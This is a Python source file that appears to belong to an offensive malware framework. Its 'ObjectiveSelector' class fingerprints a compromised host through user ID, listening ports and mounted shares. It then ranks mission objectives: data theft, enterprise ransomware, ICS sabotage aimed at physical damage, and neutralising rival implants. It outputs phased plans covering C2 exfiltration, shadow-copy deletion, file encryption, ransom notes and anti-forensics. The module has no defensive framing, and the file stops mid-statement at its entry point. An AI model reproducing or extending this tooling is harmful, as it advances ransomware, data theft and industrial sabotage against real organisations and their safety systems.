"""Objective Selector — Autonomous mission objective planning.
Analyzes environment and recommends optimal objective based on access level,
target type, and operator directives."""
import json
import os
import subprocess
import time

class ObjectiveSelector:
    """Select and configure mission objective based on environment analysis."""

    OBJECTIVES = {
        'intel_collection': {
            'description': 'Targeted data theft and intelligence gathering',
            'min_access': 'user',
            'indicators': ['file_server', 'database', 'email_server', 'sharepoint',
                          'document_store', 'source_code', 'cloud_storage'],
            'risk_level': 'low',
        },
        'ransomware': {
            'description': 'Enterprise encryption for ransom',
            'min_access': 'admin',
            'indicators': ['domain_controller', 'file_shares', 'backup_server',
                          'critical_data', 'no_offline_backup'],
            'risk_level': 'critical',
        },
        'sabotage_ics': {
            'description': 'ICS/OT disruption and physical damage',
            'min_access': 'admin',
            'indicators': ['plc', 'scada', 'modbus', 'hmi', 'ot_network',
                          'industrial_protocol', 'safety_system'],
            'risk_level': 'critical',
        },
        'counter_intel': {
            'description': 'Detect and neutralize competing operators',
            'min_access': 'user',
            'indicators': ['honeypot', 'competing_implant', 'incident_response',
                          'threat_hunting', 'soc_active'],
            'risk_level': 'medium',
        },
    }

    def __init__(self):
        self.environment = {}
        self.access_level = 'user'
        self.recommendations = []

    def assess_environment(self):
        """Analyze current environment."""
        env = {
            'hostname': os.uname().nodename if hasattr(os, 'uname') else os.environ.get('COMPUTERNAME', 'unknown'),
            'user': os.environ.get('USER', os.environ.get('USERNAME', 'unknown')),
            'uid': os.getuid() if hasattr(os, 'getuid') else -1,
            'platform': os.uname().sysname if hasattr(os, 'uname') else 'unknown',
            'indicators': [],
        }

        # Check access level
        if env['uid'] == 0 or env['user'].lower() in ('root', 'administrator', 'system'):
            self.access_level = 'admin'

        # Check for ICS indicators
        try:
            result = subprocess.run(['ss', '-tlnp'], capture_output=True, text=True, timeout=5)
            if ':502' in result.stdout:
                env['indicators'].append('modbus')
            if ':1883' in result.stdout:
                env['indicators'].append('mqtt')
            if ':8443' in result.stdout or ':443' in result.stdout:
                env['indicators'].append('hmi')
        except Exception:
            pass

        # Check for file shares
        try:
            result = subprocess.run(['df', '-h'], capture_output=True, text=True, timeout=5)
            if 'nfs' in result.stdout.lower() or 'cifs' in result.stdout.lower():
                env['indicators'].append('file_shares')
        except Exception:
            pass

        # Check for databases
        try:
            result = subprocess.run(['ss', '-tlnp'], capture_output=True, text=True, timeout=5)
            if any(f':{p}' in result.stdout for p in ['3306', '5432', '1433', '27017']):
                env['indicators'].append('database')
        except Exception:
            pass

        self.environment = env
        return env

    def recommend_objective(self, directive=None):
        """Recommend best objective based on environment and directive."""
        if not self.environment:
            self.assess_environment()

        scored = []
        for obj_name, obj_info in self.OBJECTIVES.items():
            score = 0

            # Check access level requirement
            if obj_info['min_access'] == 'admin' and self.access_level != 'admin':
                score -= 100

            # Match environment indicators
            for ind in obj_info['indicators']:
                if ind in self.environment.get('indicators', []):
                    score += 30

            # Directive boost
            if directive and directive.lower() in obj_name:
                score += 100

            scored.append((obj_name, score, obj_info))

        scored.sort(key=lambda x: x[1], reverse=True)

        self.recommendations = [
            {'objective': name, 'score': score, 'description': info['description'],
             'risk': info['risk_level']}
            for name, score, info in scored
        ]

        return self.recommendations

    def generate_mission_plan(self, objective_name):
        """Generate mission execution plan for selected objective."""
        obj = self.OBJECTIVES.get(objective_name)
        if not obj:
            return {'error': f'Unknown objective: {objective_name}'}

        plan = {
            'objective': objective_name,
            'description': obj['description'],
            'access_level': self.access_level,
            'environment': self.environment,
            'phases': [],
        }

        # Common pre-phases
        plan['phases'].append({'name': 'Counter-Intel Check', 'module': 'objective_counter_intel', 'critical': True})

        if objective_name == 'intel_collection':
            plan['phases'].extend([
                {'name': 'Scan Targets', 'module': 'objective_intel_collection', 'action': 'scan'},
                {'name': 'Collect Priority Files', 'module': 'objective_intel_collection', 'action': 'collect'},
                {'name': 'Create Archive', 'module': 'objective_intel_collection', 'action': 'archive'},
                {'name': 'Exfiltrate', 'module': 'c2_orchestrator_failover', 'action': 'exfil'},
            ])
        elif objective_name == 'ransomware':
            plan['phases'].extend([
                {'name': 'Discover Targets', 'module': 'objective_ransomware_enterprise', 'action': 'discover'},
                {'name': 'Delete Shadow Copies', 'module': 'objective_ransomware_enterprise', 'action': 'shadows'},
                {'name': 'Encrypt Files', 'module': 'objective_ransomware_enterprise', 'action': 'encrypt'},
                {'name': 'Drop Notes', 'module': 'objective_ransomware_enterprise', 'action': 'notes'},
            ])
        elif objective_name == 'sabotage_ics':
            plan['phases'].extend([
                {'name': 'Snapshot State', 'module': 'objective_sabotage_ics', 'action': 'snapshot'},
                {'name': 'Execute Profile', 'module': 'objective_sabotage_ics', 'action': 'execute'},
            ])
        elif objective_name == 'counter_intel':
            plan['phases'].extend([
                {'name': 'Full Assessment', 'module': 'objective_counter_intel', 'action': 'assess'},
            ])

        # Common post-phase
        plan['phases'].append({'name': 'Anti-Forensics', 'module': 'enhanced_anti_forensics', 'action': 'cleanup'})

        return plan


def main():
    selector = ObjectiveSelector()
    env = selector.assess_environment()
    print(f'Environment: {json.dumps(env, indent=2)}')

    recs = selector.recommend_objective()
    print(f'\nRecommendations:')
    for r in recs:
        print(f'  [{r["score"]}] {r["objective"]}: {r["description"]} (risk: {r["risk"]})')

    if recs:
        plan = selector.generate_mission_plan(recs[0]['objective'])
        print(f'\nMission Plan: {json.dumps(plan, indent=2)}')

if __name__ == '__main__':
